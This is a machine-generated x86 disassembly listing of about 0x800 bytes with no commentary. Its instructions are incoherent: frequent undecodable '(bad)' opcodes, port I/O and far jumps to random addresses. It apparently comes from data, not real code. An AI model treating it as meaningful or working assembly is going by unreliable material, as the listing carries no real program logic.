  42e0ce:	or     bh,ch
  42e0d0:	jecxz  0x42e09a
  42e0d2:	rcl    esp,cl
  42e0d4:	retf   0xd9c2
  42e0d7:	fnstenv [edi-0x163b4537]
  42e0dd:	imul   bh
  42e0df:	shl    dl,1
  42e0e1:	loope  0x42e0a2
  42e0e3:	in     al,0xdc
  42e0e5:	cmc    
  42e0e6:	fsubp  st(2),st
  42e0e8:	aad    0x9
  42e0ea:	fsubrp st(2),st
  42e0ec:	fiadd  DWORD PTR [ebx]
  42e0ee:	pextrw edi,(bad),0xc5
  42e0f0:	mov    esp,0xdbafe8d3
  42e0f5:	icebp  
  42e0f6:	into   
  42e0f7:	(bad)  
  42e0f8:	test   ebp,0xcfeccfdd
  42e0fe:	ret    
  42e0ff:	loope  0x42e0b9
  42e101:	loop   0x42e0f7
  42e103:	ret    0xc001
  42e106:	add    eax,DWORD PTR [edx]
  42e108:	fld    DWORD PTR [edi+ebp*8]
  42e10b:	or     edx,ecx
  42e10d:	fucomip st,st(4)
  42e10f:	lods   al,BYTE PTR ds:[esi]
  42e110:	shr    DWORD PTR [esi-0x53b153c],0xf5
  42e117:	out    dx,al
  42e118:	mov    bh,0xc4
  42e11a:	fucomip st,st(5)
  42e11c:	in     eax,dx
  42e11d:	idiv   edx
  42e11f:	rol    BYTE PTR [ecx],1
  42e121:	fst    st(6)
  42e123:	in     eax,dx
  42e124:	mov    esi,0xe8d8dec1
  42e129:	or     edi,esp
  42e12b:	jmp    0x42e109
  42e12d:	pop    es
  42e12e:	psrad  mm0,mm4
  42e131:	loopne 0x42e0ea
  42e133:	jmp    0x42e125
  42e135:	icebp  
  42e136:	lock int3 
  42e138:	jmp    0xd8fab91b
  42e13d:	stc    
  42e13e:	loop   0x42e0fa
  42e140:	dec    ebp
  42e142:	ret    
  42e143:	ret    0xc4d1
  42e146:	jecxz  0x42e10b
  42e148:	or     esp,ebx
  42e14a:	(bad)
  42e14d:	or     al,0xf9
  42e14f:	out    dx,al
  42e150:	into   
  42e151:	loop   0x42e11f
  42e153:	jmp    0xb33d9d1b
  42e158:	retf   0xbec4
  42e15b:	hlt    
  42e15c:	repnz int3 
  42e15e:	fmulp  st(0),st
  42e160:	clc    
  42e161:	cli    
  42e162:	fcomip st,st(7)
  42e164:	in     eax,0xc0
  42e166:	add    eax,esi
  42e168:	add    cl,al
  42e16a:	stc    
  42e16b:	leave  
  42e16c:	retf   
  42e16d:	enter  0xef0b,0xd1
  42e171:	in     al,0xaf
  42e173:	mov    bl,0xd3
  42e175:	(bad)  
  42e176:	sar    bl,1
  42e178:	idiv   BYTE PTR [ecx-0x21341a3a]
  42e17e:	hlt    
  42e17f:	out    dx,al
  42e180:	out    dx,eax
  42e181:	mov    ebp,0xf907d0d7
  42e186:	jmp    0xcf2cc873
  42e18b:	hlt    
  42e18c:	out    0xb,eax
  42e18e:	icebp  
  42e18f:	scas   eax,DWORD PTR es:[edi]
  42e190:	int3   
  42e191:	icebp  
  42e192:	retf   0xf1d1
  42e195:	jmp    0xd6b8:0xe8f7c4ef
  42e19c:	mov    edx,0xf1f5c3da
  42e1a1:	rcl    esi,1
  42e1a3:	shl    ecx,0xc5
  42e1a6:	icebp  
  42e1a7:	fcmovbe st,st(5)
  42e1a9:	(bad)  
  42e1aa:	mov    esp,0x13e6c2e9
  42e1af:	mov    cl,0xf7
  42e1b1:	sar    DWORD PTR [esi-0x34241a23],0xd6
  42e1b8:	neg    esi
  42e1ba:	rcr    ebp,cl
  42e1bc:	enter  0xf9e8,0xc8
  42e1c0:	lock mul edi
  42e1c3:	out    0xf2,eax
  42e1c5:	ret    0xfcea
  42e1c8:	loopne 0x42e1c2
  42e1ca:	retf   0xdfca
  42e1cd:	fmul   DWORD PTR [ebx]
  42e1cf:	scas   eax,DWORD PTR es:[edi]
  42e1d0:	ret    0xf2c4
  42e1d3:	call   0xbafeb68d
  42e1d8:	mov    ebx,0xeac4e8f1
  42e1dd:	(bad)  
  42e1df:	inc    dl
  42e1e1:	icebp  
  42e1e2:	xlat   BYTE PTR ds:[ebx]
  42e1e3:	jecxz  0x42e1d1
  42e1e5:	cld    
  42e1e6:	ret    0xfc1
  42e1e9:	leave  
  42e1ea:	loope  0x42e1c0
  42e1ec:	or     al,0x7
  42e1ee:	jmp    0x42e1bf
  42e1f0:	stos   BYTE PTR es:[edi],al
  42e1f1:	mov    edi,0xd3d0bdac
  42e1f6:	retf   
  42e1f7:	in     al,0xb7
  42e1f9:	enter  0xfaf2,0xf4
  42e1fd:	stc    
  42e1fe:	in     al,dx
  42e1ff:	std    
  42e200:	ret    
  42e201:	out    0xdf,al
  42e203:	mov    ebx,0xffd8f902
  42e208:	add    edi,ecx
  42e20a:	idiv   ah
  42e20c:	ud0    ecx,ebx
  42e20f:	out    0xde,eax
  42e211:	test   al,0xa4
  42e213:	jmp    0xb8d1:0xc1b5eac8
  42e21a:	repnz fsub st,st(3)
  42e21d:	fxch   st(7)
  42e21f:	cli    
  42e220:	cld    
  42e221:	loopne 0x42e1e4
  42e223:	add    al,BYTE PTR [ebx]
  42e225:	add    eax,esi
  42e227:	(bad)  
  42e228:	in     al,0xcf
  42e22a:	jmp    0xde25c7f5
  42e22f:	lods   eax,DWORD PTR ds:[esi]
  42e230:	shr    dh,cl
  42e232:	mov    ebp,0xefacc8c4
  42e237:	out    0xd7,al
  42e239:	rol    ebp,1
  42e23b:	(bad)
  42e23e:	ret    
  42e23f:	(bad)  
  42e240:	rcr    bl,cl
  42e242:	loop   0x42e244
  42e244:	loope  0x42e22d
  42e246:	push   es
  42e247:	(bad)  
  42e24b:	fucomp st(3)
  42e24d:	adc    edx,ebx
  42e24f:	mov    ecx,0xf5bdecc8
  42e254:	shl    DWORD PTR [eax+ebp*8-0x3b323b34],cl
  42e25b:	aad    0xdd
  42e25d:	cmc    
  42e25e:	idiv   esp
  42e260:	lock std 
  42e262:	mov    ah,0x2
  42e264:	rol    bl,0x3
  42e267:	inc    eax
  42e269:	(bad)  
  42e26a:	fldpi  
  42e26c:	fabs   
  42e26e:	call   0xaf31a340
  42e273:	shl    bh,0xe0
  42e276:	out    dx,al
  42e277:	les    ebp,FWORD PTR [esi-0x50a2131]
  42e27d:	hlt    
  42e27e:	loop   0x42e248
  42e280:	fcompp 
  42e282:	icebp  
  42e283:	add    ebx,eax
  42e285:	add    al,0x7
  42e287:	sti    
  42e288:	add    ecx,DWORD PTR [ecx]
  42e28a:	loopne 0x42e287
  42e28c:	cli    
  42e28d:	(bad)
  42e290:	int3   
  42e291:	enter  0xcdbe,0xe1
  42e295:	aad    0xee
  42e297:	iret   
  42e298:	cmc    
  42e299:	(bad)  
  42e29a:	shl    ah,1
  42e29c:	hlt    
  42e29d:	call   esi
  42e29f:	aam    0xd0
  42e2a1:	jecxz  0x42e284
  42e2a3:	icebp  
  42e2a4:	(bad)  
  42e2a6:	lock out 0xe8,al
  42e2a9:	dec    DWORD PTR ds:0xc9dec2e7
  42e2af:	ret    
  42e2b0:	mov    ebp,0xe8efacd6
  42e2b5:	in     eax,dx
  42e2b6:	in     eax,0xf5
  42e2b8:	sti    
  42e2b9:	mov    dh,0xb5
  42e2bb:	sar    edx,cl
  42e2bd:	mov    eax,0xfeb6dcf7
  42e2c2:	(bad)  
  42e2c4:	fld    DWORD PTR ds:0xf4c1bfd6
  42e2ca:	push   cs
  42e2cb:	sti    
  42e2cc:	or     ah,dh
  42e2ce:	or     dl,dl
  42e2d0:	out    0xcd,eax
  42e2d2:	ror    cl,0xf4
  42e2d5:	shl    eax,0xe5
  42e2d8:	int    0xea
  42e2da:	mov    edx,0xf9eebaf6
  42e2df:	loop   0x42e2e4
  42e2e1:	out    dx,al
  42e2e2:	jecxz  0x42e2c7
  42e2e4:	fnstsw WORD PTR [ecx-0x3507281c]
  42e2ea:	add    eax,ebx
  42e2ec:	clc    
  42e2ed:	add    al,0xf9
  42e2ef:	mov    dl,0xed
  42e2f1:	jecxz  0x42e2b3
  42e2f3:	enter  0xf4b7,0xf7
  42e2f7:	test   eax,0xdde9f6b5
  42e2fd:	mov    ecx,0xd8dfbc
  42e302:	fiadd  DWORD PTR [esi]
  42e304:	ret    0xe3fc
  42e307:	fdiv   st,st(7)
  42e309:	pop    es
  42e30a:	clc    
  42e30b:	aad    0xe8
  42e30d:	jmp    0xe5d2:0xe9c1ccf8
  42e314:	in     al,0xbb
  42e316:	iret   
  42e317:	aad    0xff
  42e319:	(bad)  
  42e31a:	(bad)  
  42e31b:	mov    ch,0xb9
  42e31d:	ror    esp,1
  42e31f:	test   BYTE PTR [edx],0xb9
  42e322:	(bad)  
  42e323:	repz cmc 
  42e325:	in     al,0xe4
  42e327:	mov    edi,0xfae5c1c0
  42e32c:	jecxz  0x42e30f
  42e32e:	pop    es
  42e32f:	retf   0xe1be
  42e332:	fsubr  st(5),st
  42e334:	(bad)  
  42e335:	into   
  42e336:	icebp  
  42e337:	cmc    
  42e338:	clc    
  42e339:	jmp    esi
  42e33b:	mov    bh,0xb9
  42e33d:	mov    esi,0xd6f8d6dd
  42e342:	cmc    
  42e343:	aad    0xe0
  42e345:	rcl    ch,0xde
  42e348:	jecxz  0x42e359
  42e34a:	shl    bh,0x3
  42e34d:	jmp    0xb1cd:0xe0d3aae5
  42e354:	jmp    0xbab0:0xd6f2c7c6
  42e35b:	lock mov esp,0x1ccdad6
  42e361:	jmp    eax
  42e363:	mov    ebp,0xcbe7c0fb
  42e368:	in     eax,0xdd
  42e36a:	or     ebx,ebp
  42e36c:	add    eax,0xcbcef101
  42e371:	shl    DWORD PTR [edx-0x311c1512],cl
  42e377:	into   
  42e378:	cli    
  42e379:	(bad)  
  42e37b:	fcmovu st,st(7)
  42e37d:	enter  0xd4e2,0xc2
  42e381:	shl    esp,cl
  42e383:	(bad)  
  42e384:	loope  0x42e35b
  42e386:	add    ch,dl
  42e388:	(bad)  
  42e389:	or     ecx,DWORD PTR [ecx]
  42e38b:	in     eax,0xe2
  42e38d:	out    0x1,al
  42e38f:	shl    bl,cl
  42e391:	mov    bh,0xbc
  42e393:	(bad)  
  42e394:	enter  0xb2b4,0xcb
  42e398:	(bad)  
  42e399:	in     al,0xde
  42e39b:	repnz enter 0xfaf3,0xd3
  42e3a0:	loopne 0x42e393
  42e3a2:	out    0xf4,al
  42e3a4:	add    esp,edx
  42e3a6:	loopne 0x42e391
  42e3a8:	cli    
  42e3a9:	jecxz  0x42e383
  42e3ab:	add    eax,ebp
  42e3ad:	or     edx,DWORD PTR [ecx]
  42e3af:	in     eax,dx
  42e3b0:	fisubr WORD PTR [edi+esi*8-0x3e4a4a3e]
  42e3b7:	(bad)  
  42e3b8:	leave  
  42e3b9:	mov    ecx,0xcffcd7ce
  42e3be:	fprem  
  42e3c0:	mov    esp,0x6de07fb
  42e3c5:	or     esi,esp
  42e3c7:	clc    
  42e3c8:	(bad)  
  42e3ca:	stc    
  42e3cb:	aad    0xe5
  42e3cd:	in     al,0xe3
  42e3cf:	in     eax,0xef
  42e3d1:	int3   
  42e3d2:	mov    esi,0xc6facdf6
  42e3d7:	(bad)  
  42e3d8:	not    ebx
  42e3da:	rcl    ecx,cl
  42e3dc:	inc    DWORD PTR [edx]
  42e3de:	cmc    
  42e3df:	cld    
  42e3e0:	rcl    ecx,0xcd
  42e3e3:	ret    0xf1d2
  42e3e6:	shl    esp,1
  42e3e8:	out    0x6,eax
  42e3ea:	clc    
  42e3eb:	jmp    0x42e3fb
  42e3ed:	enter  0xdfff,0xbf
  42e3f1:	iret   
  42e3f2:	in     eax,dx
  42e3f3:	rcl    bh,cl
  42e3f5:	out    dx,al
  42e3f6:	retf   0xdbeb
  42e3f9:	jmp    0xfefa:0xcad2d8d5
  42e400:	xlat   BYTE PTR ds:[ebx]
  42e401:	aad    0xd6
  42e403:	loopne 0x42e3e7
  42e405:	in     al,0xea
  42e407:	(bad)  
  42e408:	test   DWORD PTR [eax],0x3c6edce
  42e40e:	iret   
  42e40f:	mov    edi,0xc0f7e6ea
  42e415:	loop   0x42e3f1
  42e417:	fsub   st,st(5)
  42e419:	retf   0xfffa
  42e41c:	mov    edi,0xf4fbd2df
  42e421:	push   es
  42e422:	mov    ebp,0xe1fcd0e7
  42e427:	leave  
  42e428:	out    0xd5,al
  42e42a:	or     cl,BYTE PTR [eax]
  42e42c:	psraw  mm0,QWORD PTR [ebx]
  42e42f:	jmp    0x42e3e1
  42e431:	leave  
  42e432:	lods   eax,DWORD PTR ds:[esi]
  42e433:	jmp    0xf8f7daea
  42e438:	lock mov ebx,0xecb9c8b0
  42e43e:	ret    0xd8bf
  42e441:	loope  0x42e410
  42e443:	(bad)
  42e446:	rcl    eax,1
  42e448:	loope  0x42e42a
  42e44a:	clc    
  42e44b:	loope  0x42e411
  42e44d:	retf   0xc811
  42e450:	jecxz  0x42e415
  42e452:	shl    edi,0xe6
  42e455:	icebp  
  42e456:	jmp    0x42e42e
  42e458:	jmp    0x42e44f
  42e45a:	mov    eax,0xfedfe8d5
  42e45f:	mov    ecx,0xe1c2d7f6
  42e464:	test   BYTE PTR [ecx],0xc5
  42e467:	ret    
  42e468:	in     eax,0xe5
  42e46a:	fcmovu st,st(4)
  42e46c:	add    eax,0xeeca12e8
  42e471:	fdivr  st(6),st
  42e473:	hlt    
  42e474:	ror    eax,1
  42e476:	retf   0xf2e4
  42e479:	idiv   dl
  42e47b:	mov    edi,0xdecdedc9
  42e480:	enter  0xc3e1,0x5
  42e484:	les    eax,FWORD PTR [eax]
  42e486:	(bad)  
  42e488:	sti    
  42e489:	fild   DWORD PTR [ecx]
  42e48b:	add    cl,BYTE PTR [ebx]
  42e48d:	sti    
  42e48e:	adc    ecx,esi
  42e490:	rol    edi,1
  42e492:	ret    
  42e493:	not    esp
  42e495:	call   0xf43ab74c
  42e49a:	in     al,0xd0
  42e49c:	idiv   DWORD PTR [edx-0x2617063e]
  42e4a2:	add    DWORD PTR [edx+eax*1],eax
  42e4a5:	les    eax,FWORD PTR ds:0x2c9cbe1
  42e4ab:	add    BYTE PTR [eax],cl
  42e4ad:	pop    es
  42e4ae:	int    0xd3
  42e4b0:	mov    edi,0xcbcedcc7
  42e4b5:	idiv   ecx
  42e4b7:	out    0xe7,eax
  42e4b9:	cli    
  42e4ba:	mov    ecx,0xdd02e9e5
  42e4bf:	loope  0x42e47a
  42e4c1:	sti    
  42e4c2:	(bad)  
  42e4c3:	std    
  42e4c4:	sar    dl,cl
  42e4c6:	retf   0xc4
  42e4c9:	push   es
  42e4ca:	iret   
  42e4cb:	aad    0xce
  42e4cd:	enter  0xbeda,0xee
  42e4d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e4d2:	fadd   st(0),st
  42e4d4:	mov    bl,0xb2
  42e4d6:	(bad)  
  42e4d8:	loopne 0x42e4b3
  42e4da:	aam    0xeb
  42e4dc:	out    dx,al
  42e4dd:	(bad)  
  42e4de:	cli    
  42e4df:	cld    
  42e4e0:	rol    BYTE PTR [esi],1
  42e4e2:	aam    0xe3
  42e4e4:	fild   DWORD PTR [ecx]
  42e4e6:	(bad)  
  42e4e8:	(bad)  
  42e4e9:	retf   0x3d8
  42e4ec:	(bad)  
  42e4ee:	(bad)  
  42e4f0:	(bad)  
  42e4f1:	jecxz  0x42e4d7
  42e4f3:	mov    bh,0xd7
  42e4f5:	int    0xc7
  42e4f7:	rcr    ecx,1
  42e4f9:	icebp  
  42e4fa:	retf   0xdcfa
  42e4fd:	add    cl,dl
  42e4ff:	int3   
  42e500:	mov    dh,0xf8
  42e502:	out    0x4,eax
  42e504:	fcmovu st,st(4)
  42e506:	cmc    
  42e507:	mul    al
  42e509:	std    
  42e50a:	add    eax,0xecf9e706
  42e50f:	in     eax,dx
  42e510:	int    0xee
  42e512:	fmulp  st(6),st
  42e514:	icebp  
  42e515:	mov    al,0xe7
  42e517:	mov    bh,0xcd
  42e519:	mov    dh,0xcc
  42e51b:	fcmovnbe st,st(6)
  42e51d:	fsubrp st(2),st
  42e51f:	rcr    ch,cl
  42e521:	loope  0x42e51e
  42e523:	rcl    esi,1
  42e525:	(bad)
  42e528:	jmp    0xfc0ac43b
  42e52d:	retf   0xc104
  42e530:	call   0xf219bcf2
  42e535:	mov    al,0xf4
  42e537:	jmp    0xbe17a02e
  42e53c:	call   esi
  42e53e:	test   bh,0xf3
  42e541:	(bad)  
  42e543:	sar    esi,cl
  42e545:	fdivr  st(7),st
  42e547:	ret    
  42e548:	(bad)  
  42e549:	out    0xb,eax
  42e54b:	out    dx,al
  42e54c:	in     eax,dx
  42e54d:	pop    es
  42e54e:	psrlw  mm5,mm0
  42e551:	in     eax,0xcb
  42e553:	aam    0xc1
  42e555:	mov    ebx,0xc9f9d3d3
  42e55a:	mov    ebx,0xf6dbfcfd
  42e55f:	sti    
  42e560:	mov    ecx,0xe0c7f3df
  42e565:	mul    esi
  42e567:	or     edx,eax
  42e569:	add    eax,0xf8ccdee7
  42e56e:	push   cs
  42e56f:	in     eax,0xf7
  42e571:	out    dx,al
  42e572:	ffree  st(1)
  42e574:	out    0xee,al
  42e576:	jmp    0x42e52d
  42e578:	(bad)  
  42e579:	mov    edi,0xc8f9e4d9
  42e57e:	cld    
  42e57f:	hlt    
  42e580:	repz mul bl
  42e583:	loopne 0x42e56b
  42e585:	shl    dh,cl
  42e587:	rol    dl,1
  42e589:	sti    
  42e58a:	mov    esp,0xc4edc202
  42e58f:	in     al,0xd3
  42e591:	mov    esi,0xf3c0cbbe
  42e596:	icebp  
  42e597:	stc    
  42e598:	out    0xb4,al
  42e59a:	sti    
  42e59b:	aam    0xcb
  42e59d:	clc    
  42e59e:	std    
  42e59f:	(bad)  
  42e5a0:	fsub   st(7),st
  42e5a2:	sti    
  42e5a3:	(bad)  
  42e5a5:	neg    ch
  42e5a7:	loop   0x42e594
  42e5a9:	paddb  mm0,QWORD PTR [ebx]
  42e5ac:	hlt    
  42e5ad:	add    ch,dh
  42e5af:	repnz (bad) 
  42e5b1:	scas   eax,DWORD PTR es:[edi]
  42e5b2:	in     al,0xce
  42e5b4:	aam    0xea
  42e5b6:	int3   
  42e5b7:	div    DWORD PTR [ecx+edi*8-0xa363250]
  42e5be:	fcom   st(6)
  42e5c0:	iret   
  42e5c1:	aam    0xf9
  42e5c3:	fcmovnu st,st(2)
  42e5c5:	loope  0x42e58a
  42e5c7:	(bad)  
  42e5c9:	or     ebx,edi
  42e5cb:	cmc    
  42e5cc:	retf   
  42e5cd:	sti    
  42e5ce:	in     al,0xab
  42e5d0:	out    dx,eax
  42e5d1:	loopne 0x42e5b9
  42e5d3:	mov    esp,0xc0b3dae7
  42e5d8:	in     eax,0xfe
  42e5da:	icebp  
  42e5db:	in     al,0xb6
  42e5dd:	icebp  
  42e5de:	in     eax,dx
  42e5df:	loop   0x42e5dd
  42e5e1:	loop   0x42e5b8
  42e5e3:	rol    DWORD PTR [edx],0x1
  42e5e6:	ret    
  42e5e7:	(bad)  
  42e5e8:	fld    DWORD PTR [ecx+eax*1]
  42e5eb:	retf   0xe4f3
  42e5ee:	jmp    0xc42cc7b3
  42e5f3:	in     eax,0xdc
  42e5f5:	sar    DWORD PTR [ebx-0x3a2f3a1a],1
  42e5fb:	retf   
  42e5fc:	sar    dl,1
  42e5fe:	(bad)  
  42e5ff:	repz sar DWORD PTR [ecx+0x3d4c0d4],1
  42e606:	shl    ebp,0xf
  42e609:	(bad)  
  42e60a:	call   0x355eb13
  42e60f:	(bad)  
  42e610:	shr    BYTE PTR [esi-0x163e1f52],cl
  42e616:	sti    
  42e617:	jmp    0xb5ee:0xd4cff3f2
  42e61e:	fnstsw ax
  42e620:	mov    ebp,0xddd5e3cd
  42e625:	(bad)  
  42e626:	stc    
  42e627:	loopne 0x42e5fe
  42e629:	loope  0x42e614
  42e62b:	push   es
  42e62c:	jmp    0xddeb:0xa6b90fc4
  42e633:	in     eax,dx
  42e634:	fdiv   QWORD PTR [edx-0x2d110830]
  42e63a:	fcmove st,st(2)
  42e63c:	jecxz  0x42e62a
  42e63e:	cmc    
  42e63f:	clc    
  42e640:	loopne 0x42e637
  42e642:	mov    edi,0xcadaecd8
  42e647:	ret    0xeadb
  42e64a:	push   es
  42e64b:	cmc    
  42e64c:	add    edi,edi
  42e64e:	retf   0xbdc4
  42e651:	mov    edi,0xc3b4c2c6
  42e656:	(bad)  
  42e657:	mov    ch,0xe0
  42e659:	lods   eax,DWORD PTR ds:[esi]
  42e65a:	fsubrp st(5),st
  42e65c:	fcmovnu st,st(5)
  42e65e:	xlat   BYTE PTR ds:[ebx]
  42e65f:	(bad)  
  42e660:	sar    ch,cl
  42e662:	loop   0x42e663
  42e664:	fcmovnu st,st(6)
  42e666:	lds    eax,FWORD PTR [eax]
  42e668:	idiv   ebp
  42e66a:	out    dx,eax
  42e66b:	jmp    0xc844c33a
  42e670:	lds    edi,FWORD PTR [ecx+eiz*8-0x152e3c32]
  42e677:	in     al,0xd0
  42e679:	hlt    
  42e67a:	call   0xf83bbc39
  42e67f:	cld    
  42e680:	mov    dh,0xf5
  42e682:	mov    ebp,0xddbcd6dd
  42e687:	or     eax,DWORD PTR ds:0xdde4f5e9
  42e68d:	(bad)  
  42e68e:	out    dx,al
  42e68f:	test   eax,0xceddebaf
  42e694:	mov    cl,0xd2
  42e696:	retf   
  42e697:	sar    DWORD PTR [ecx-0x28361234],1
  42e69d:	cld    
  42e69e:	fdivp  st(3),st
  42e6a0:	out    dx,al
  42e6a1:	int    0xdd
  42e6a3:	sti    
  42e6a4:	fld    st(4)
  42e6a6:	or     DWORD PTR [ebx],ecx
  42e6a8:	in     eax,0xe
  42e6aa:	loop   0x42e671
  42e6ac:	or     DWORD PTR [edx+eax*1],eax
  42e6af:	jmp    0xd6b0:0xd2eecbbc
  42e6b6:	out    dx,al
  42e6b7:	leave  
  42e6b8:	mov    al,0xbb
  42e6ba:	(bad)  
  42e6bb:	mov    bh,0xbf
  42e6bd:	cli    
  42e6be:	into   
  42e6bf:	std    
  42e6c0:	loop   0x42e6a4
  42e6c2:	int3   
  42e6c3:	pop    es
  42e6c4:	f2xm1  
  42e6c6:	sar    edi,0xdf
  42e6c9:	loopne 0x42e6d8
  42e6cb:	(bad)
  42e6ce:	sar    DWORD PTR [ecx-0x4d493e19],cl
  42e6d4:	scas   al,BYTE PTR es:[edi]
  42e6d5:	out    dx,eax
  42e6d6:	stc    
  42e6d7:	(bad)
  42e6da:	neg    esp
  42e6dc:	(bad)  
  42e6de:	repz faddp st(0),st
  42e6e1:	out    0xfa,al
  42e6e3:	xlat   BYTE PTR ds:[ebx]
  42e6e4:	fadd   QWORD PTR [esi]
  42e6e6:	add    al,0xde
  42e6e8:	out    dx,eax
  42e6e9:	aam    0xed
  42e6eb:	fld    QWORD PTR [esi]
  42e6ed:	in     al,dx
  42e6ee:	call   eax
  42e6f0:	shl    BYTE PTR [edx-0x2a091129],cl
  42e6f6:	mov    ch,0xb7
  42e6f8:	iret   
  42e6f9:	out    0xfa,al
  42e6fb:	into   
  42e6fc:	(bad)  
  42e6fe:	test   cl,0xdd
  42e701:	sar    al,cl
  42e703:	int3   
  42e704:	add    eax,0x8bfeafc
  42e709:	push   cs
  42e70a:	loope  0x42e716
  42e70c:	fcmovb st,st(1)
  42e70e:	fcmovu st,st(7)
  42e710:	mov    cl,0xe0
  42e712:	into   
  42e713:	out    0xb2,eax
  42e715:	ret    
  42e716:	iret   
  42e717:	enter  0xf6f0,0xfd
  42e71b:	enter  0xcfbd,0xe9
  42e71f:	lock add edx,edx
  42e722:	(bad)  
  42e724:	int3   
  42e725:	jmp    0xe80f:0x6d0daf7
  42e72c:	loope  0x42e6f3
  42e72e:	in     al,0xd9
  42e730:	lods   eax,DWORD PTR ds:[esi]
  42e731:	vshufps xmm6,xmm5,xmm3,0xc4
  42e736:	mov    bh,0xcf
  42e738:	repz rcl al,cl
  42e73b:	shl    BYTE PTR [edx+ebp*8-0x11fd0728],1
  42e742:	pop    es
  42e743:	(bad)  
  42e745:	add    dl,cl
  42e747:	lock add esp,ebp
  42e74a:	out    dx,al
  42e74b:	fiadd  WORD PTR [edi]
  42e74d:	(bad)  
  42e74e:	out    dx,al
  42e74f:	test   al,0xcf
  42e751:	test   al,0xe4
  42e753:	int3   
  42e754:	icebp  
  42e755:	mov    bh,0xd0
  42e757:	in     al,dx
  42e758:	jmp    0xd30bc70a
  42e75d:	(bad)  
  42e75e:	in     eax,dx
  42e75f:	fcmovnbe st,st(4)
  42e761:	pop    es
  42e762:	mov    edi,0xf10adcfe
  42e767:	jmp    edx
  42e769:	retf   
  42e76a:	fiadd  DWORD PTR ds:0xb307edee
  42e770:	(bad)  
  42e771:	lods   al,BYTE PTR ds:[esi]
  42e772:	jecxz  0x42e74b
  42e774:	ret    0xd2d1
  42e777:	scas   eax,DWORD PTR es:[edi]
  42e778:	push   eax
  42e77a:	out    0xb4,al
  42e77c:	(bad)  
  42e77d:	sti    
  42e77e:	mov    ebp,0x1dad2df
  42e783:	add    al,ah
  42e785:	fadd   DWORD PTR ds:0xe007c8d1
  42e78b:	(bad)  
  42e78c:	out    0xfa,eax
  42e78e:	or     ebx,esp
  42e790:	out    dx,eax
  42e791:	fucom  st(3)
  42e793:	loope  0x42e75a
  42e795:	rcl    esp,0xf8
  42e798:	out    0xee,al
  42e79a:	mov    ebx,0xd0fabfb6
  42e79f:	int    0xce
  42e7a1:	loop   0x42e763
  42e7a3:	rol    DWORD PTR [edx],1
  42e7a5:	fcomi  st,st(2)
  42e7a7:	add    eax,0xcedfd8c6
  42e7ac:	sti    
  42e7ad:	or     ch,dh
  42e7af:	fdivr  QWORD PTR [eax-0x373d3e3f]
  42e7b5:	loope  0x42e76c
  42e7b7:	in     eax,dx
  42e7b8:	jmp    0xd72eba98
  42e7bd:	mov    ch,0xf6
  42e7bf:	rcl    ah,1
  42e7c1:	test   bl,0xfe
  42e7c4:	ret    
  42e7c5:	repz add al,BYTE PTR [eax]
  42e7c8:	in     eax,0xd6
  42e7ca:	loope  0x42e797
  42e7cc:	jecxz  0x42e7a9
  42e7ce:	into   
  42e7cf:	fmul   st(7),st
  42e7d1:	shr    edi,0xef
  42e7d4:	in     eax,0xe6
  42e7d6:	hlt    
  42e7d7:	rcl    cl,cl
  42e7d9:	idiv   DWORD PTR [esi-0xb210204]
  42e7df:	call   0x2ffa1d5
  42e7e4:	(bad)  
  42e7e5:	loop   0x42e7b9
  42e7e7:	out    0xd0,al
  42e7e9:	add    ebp,ecx
  42e7eb:	fucomp st(3)
  42e7ed:	jecxz  0x42e7d5
  42e7ef:	int3   
  42e7f0:	shr    edx,cl
  42e7f2:	mov    bh,0xae
  42e7f4:	into   
  42e7f5:	repz shr ebp,0xd2
  42e7f9:	idiv   BYTE PTR [ebx-0x146240d]
  42e7ff:	neg    al
  42e801:	clc    
  42e802:	fld    DWORD PTR [esi]
  42e804:	out    0xd2,eax
  42e806:	add    eax,0xfe03d905
  42e80b:	add    edi,ebx
  42e80d:	out    dx,eax
  42e80e:	icebp  
  42e80f:	fcom   st(1)
  42e811:	jmp    0xec07c4ec
  42e816:	lds    esi,FWORD PTR [ecx-0x35112450]
  42e81c:	rol    bl,1
  42e81e:	loop   0x42e809
  42e820:	aam    0xe6
  42e822:	lock lock lock loopne 0x42e82a
  42e827:	icebp  
  42e828:	(bad)  
  42e829:	fsubp  st(5),st
  42e82b:	or     al,BYTE PTR [eax]
  42e82d:	out    dx,eax
  42e82e:	out    dx,al
  42e82f:	fdiv   QWORD PTR [eax-0x322c1357]
  42e835:	ror    cl,cl
  42e837:	jmp    0xe628ba12
  42e83c:	ror    ah,cl
  42e83e:	(bad)  
  42e83f:	fcom   st(5)
  42e841:	mov    ebp,0x6e5f2
  42e846:	jecxz  0x42e824
  42e848:	std    
  42e849:	call   0x93ef549
  42e84e:	ffree  st(4)
  42e850:	mov    esp,0xc3eeb0eb
  42e855:	shl    cl,0xe4
  42e858:	(bad)  
  42e859:	idiv   edi
  42e85b:	int    0xfb
  42e85d:	add    ebx,esi
  42e85f:	jmp    0xed1db65d
  42e864:	fcmove st,st(3)
  42e866:	faddp  st(5),st
  42e868:	mov    esi,0x4c6d4c7
  42e86d:	leave  
  42e86e:	add    cl,dl
  42e870:	(bad)
  42e873:	ror    dl,cl
  42e875:	enter  0xdbc1,0xf7
  42e879:	mov    dh,0xbe
  42e87b:	fdecstp 
  42e87d:	mov    ebx,0xc107c2dc
  42e882:	fucom  st(4)
  42e884:	out    0xe1,al
  42e886:	add    ebp,esi
  42e888:	or     esp,esi
  42e88a:	or     DWORD PTR [esi],eax
  42e88c:	or     ecx,eax
  42e88e:	bswap  ebp
  42e890:	mov    dl,0xe6
  42e892:	int    0xe0
  42e894:	int3   
  42e895:	shl    edi,1
  42e897:	in     al,dx
  42e898:	into   
  42e899:	fsubp  st(4),st
  42e89b:	jmp    0xbe:0xf301f2be
  42e8a2:	fiadd  DWORD PTR [eax]
  42e8a4:	rcl    esi,0xbc
  42e8a7:	(bad)  
  42e8a8:	(bad)  
  42e8a9:	cmc    
  42e8aa:	retf   
  42e8ab:	add    DWORD PTR [esi],ecx
  42e8ad:	call   0xaa23c984
  42e8b2:	mov    esi,0xc7c5b7d2
  42e8b7:	mov    ch,0xb4
  42e8b9:	mov    bh,0xbf
  42e8bb:	stc    
  42e8bc:	fcom   st(2)
  42e8be:	mov    ebx,0xc7bebecd
  42e8c3:	cmc    
  42e8c4:	(bad)  
  42e8c6:	out    0xe6,al
  42e8c8:	les    ecx,FWORD PTR [esi]
  42e8ca:	(bad)  
  42e8cb:	or     ah,ah
  42e8cd:	(bad)  
  42e8cf:	retf   0xcaed
  42e8d2:	shl    dl,1
  42e8d4:	sti    
  42e8d5:	loopne 0x42e89e
